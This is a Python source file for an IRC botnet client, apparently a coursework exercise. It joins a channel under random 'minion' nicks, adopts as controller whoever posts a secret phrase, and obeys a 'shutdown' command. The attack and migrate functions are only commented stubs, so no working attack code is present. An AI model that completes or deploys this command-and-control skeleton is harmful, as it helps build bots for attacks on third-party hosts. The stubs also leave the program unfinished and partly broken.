#bot.py
import sys
import random
import socket
import string
import time

# Function to get a nick with a high probability of being unique by using randomness
def getNick():
    rootOfName = "minion"
    candidateTail = ""
    for _ in range(4):
        candidateTail = candidateTail + str(random.choice(string.ascii_letters + string.digits))
    return (rootOfName + candidateTail)

# Function to connect to IRC server and send NICK and USER messages
# Will also join CHANNEL if it exist and create it if it doesnt
def connectToIRC():
    global IRCconnection
    global nick
    try:
        print("Starting IRC server connection...")
        IRCconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       # Create socket for TCP connection to IRC channet
        IRCconnection.connect((HOSTNAME,PORT))                                  # Connect to cmd line specified host and port
        print("Connected to IRC server at " + HOSTNAME)
        nickSet = False
        while(nickSet == False):
            candidateNick = getNick()
            NICK_Msg = "NICK " + candidateNick +"\r\n"                          # Construct NICK message
            USER_Msg = "USER " + candidateNick + " * * :Not Yourconsern\r\n"    # Construct USER message
            IRCconnection.sendall(NICK_Msg.encode("utf-8"))                     # Send NICK message
            IRCconnection.sendall(USER_Msg.encode("utf-8"))
            NICK_Response = IRCconnection.recv(512)                             # Recieve NICK response of 512 characters max for IRC protocol
            print(NICK_Response.decode("utf-8"))
            NICK_Response = NICK_Response.split()
            if((NICK_Response[1]).decode("utf-8") == "001"):
                nick = candidateNick                                            # If nick is not in use already, set global nick variable
                nickSet = True                                                  # Change nickSet flag to true
                joinChannel(CHANNEL)
    except Exception as e:
        print("Error1: " + str(e))
        time.sleep(5)


# Function that monitors IRC message traffic to find messages containing the keyword
def listen():
    global controllerNick
    madeContactWithControl = False
    try:
        while(True):
            ircmessage = IRCconnection.recv(512)
            ircmessage = ircmessage.decode("utf-8")
            print("received: " + ircmessage)
            splitmessage = ircmessage.split()
            if(ircmessage.isspace()):                                           # Server trying to kick bot
                IRCconnection.close()                                           # Close connection to IRC
                return                                                          # Attempt to reconnect in main
            else:
                if((len(splitmessage) > 0) and (splitmessage[0] == "PING")):      # Prevent inactive connection from closing
                    IRCconnection.sendall(b'PONG\r\n')
                    print("sent: PONG")
                elif (SECRET_PHRASE in splitmessage):                           # Detect use of SECRET_PHRASE as message in CHANNEL
                    print("secret phrase detected")                             #TODO: what is sufficient proof of the secret phrase?
                    controllerNick = (splitmessage[0].split("!")[0])[1:]        # Get nick of user who sent secret phrase as stand alone message
                    madeContactWithControl = True
                    print("controller nick is: " + controllerNick)
                elif(len(splitmessage) > 3):
                    lastWord = (splitmessage[len(splitmessage)-1])[1:]                           # Get first word of messeage - drop ':' char
                    nickOfSender = (splitmessage[0].split("!")[0])[1:]
                    if((lastWord == "shutdown") and (madeContactWithControl) and (nickOfSender == controllerNick)):
                        shutdownBot()
                    print("received word: " + lastWord)

    except Exception as e:
        print("Error2: " + str(e))
        main()





def joinChannel(chann):
    joinMessage = "JOIN #" + chann + "\r\n"
    IRCconnection.sendall(joinMessage.encode("utf-8"))
    response = IRCconnection.recv(512)
    print(response.decode("utf-8"))

'''
def sendMessage():

def joinChannel():

def leaveChannel():

def authenticateController():

# Function that sends the nick of the bot to the controller
def sendStatus:

# Function that attacks hostName:hostPort by attempting to connect to hostName:hostPort
# and sending a string containing the attack count and nick of the bot. Sends status message
# to controler after attack is attempted
def attack(hostName, hostPort):

# Function to move bot from current IRC server to IRC server on hostName:hostPort #channel
# Will send status of migration attempt to controller on current IRC before disconnecting
def migrate(hostName, hostPort, channel):

# Function to shutdown the bot when instructed by controller.
'''
def shutdownBot():
    print("Recieved 'shutdown' command from controller.\nShutting down.\nGoodbye.")
    IRCconnection.close()
    sys.exit()

def main():
    global HOSTNAME
    global PORT
    global CHANNEL
    global SECRET_PHRASE                                                        # Secret code word that IRC bot will listen for to ID controller
    global shutdownFlag                                                         # Will only be true when controller issues 'shutdown' command

    if len(sys.argv) == 5:
        HOSTNAME = str(sys.argv[1])
        PORT = int(sys.argv[2])
        CHANNEL = str(sys.argv[3])
        SECRET_PHRASE = ":" + str(sys.argv[4])
        attackCount = 0
        shutdownFlag = False                                                    # Bot will try to connect to HOSTNAME:PORT every 5 seconds unless this is set to True
        while(not shutdownFlag):
            connectToIRC()
            listen()
            time.sleep(5)                                                       # Wait 5 seconds before attempting to reconnect

    else:
        print("Error: wrong command line arguments", file = sys.stderr)

if __name__ == "__main__":
    main()
